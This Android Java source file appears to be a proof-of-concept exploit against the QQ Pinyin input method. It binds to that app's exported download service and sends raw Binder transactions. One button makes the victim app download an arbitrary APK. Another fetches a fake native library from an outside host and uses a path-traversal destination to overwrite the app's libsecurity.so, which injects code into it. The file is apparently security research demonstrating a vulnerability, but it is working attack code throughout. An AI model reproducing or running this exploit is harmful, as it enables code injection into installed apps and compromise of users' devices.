package com.github.thecjw.qqpinyindownload;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.Toast;

import org.androidannotations.annotations.AfterViews;
import org.androidannotations.annotations.Click;
import org.androidannotations.annotations.EActivity;
import org.androidannotations.annotations.ViewById;

@EActivity(R.layout.activity_launcher)
public class LauncherActivity extends AppCompatActivity {

  private final static String TAG = LauncherActivity.class.getSimpleName();
  private final static String INTERFACE_TOKEN = "com.tencent.qqpinyin.voice.IDownloadApkService";

  private boolean is_download_service_bound = false;
  private IBinder download_service = null;

  private ServiceConnection account_service_connection = new ServiceConnection() {

    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {

      is_download_service_bound = true;
      try {
        Toast.makeText(getApplicationContext(), "Connected with " + service.getInterfaceDescriptor(), Toast.LENGTH_SHORT).show();
        download_service = service;
      } catch (Exception e) {
        is_download_service_bound = false;
        Log.e(TAG, "Exception raised.");
        e.printStackTrace();
      }
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {
      is_download_service_bound = false;
      Log.v(TAG, "Disconnected: " + name);
    }
  };

  private void bind_remote_service() {
    if (!is_download_service_bound) {
      Intent intent = new Intent();
      intent.setComponent(new ComponentName("com.tencent.qqpinyin", "com.tencent.qqpinyin.voice.DownloadApkService"));
      bindService(intent, account_service_connection, Context.BIND_AUTO_CREATE);
    }
  }

  private boolean call_download_service(String file_url, String download_path) {
    boolean status = false;
    if (!is_download_service_bound || download_service == null) {
      return status;
    }

    try {
      Parcel data = Parcel.obtain();
      Parcel reply = Parcel.obtain();

      Toast.makeText(getApplicationContext(), "Start downloading : " + file_url, Toast.LENGTH_SHORT).show();

      // startDownload = 1
      data.writeInterfaceToken(INTERFACE_TOKEN);
      data.writeString(file_url);
      data.writeString(download_path);
      if (!download_service.transact(1, data, reply, 0)) {
        return status;
      }

      data.recycle();
      reply.recycle();

      status = true;

    } catch (RemoteException e) {
      Log.e(TAG, "RemoteException raised.");
      e.printStackTrace();
      return status;
    }

    return status;
  }

  @AfterViews
  void init_view() {
    Log.d(TAG, "loading.");
  }

  @Override
  protected void onPause() {
    super.onPause();
    if (is_download_service_bound) {
      unbindService(account_service_connection);
      is_download_service_bound = false;
    }
  }

  @Override
  protected void onResume() {
    super.onResume();
    if (!is_download_service_bound) {
      bind_remote_service();
    }
  }

  @Click
  void doDownloadArbitraryFile() {
    if (is_download_service_bound) {
      String file_url = "http://shouji.360tpcdn.com/150922/76da5c4a51ea8b6881a5da4e0a835249/com.qihoo.appstore_300030250.apk";
      String download_path = "tencentmobilemanager5.5.0.apk";
      call_download_service(file_url, download_path);
    } else {
      // TODO: show toast.
    }
  }

  @Click
  void doInfectLibSecurity() {
    if (is_download_service_bound) {
      String file_url = "http://thecjw.0GiNr.com/7e8b56123e6d56f85e4d2af7a2def57c/libFakeSecurity.so";
      String download_path = "../../../../../../data/data/com.tencent.qqpinyin/app_lib/libsecurity.so";
      call_download_service(file_url, download_path);
    } else {
      // TODO: show toast.
    }
  }
}
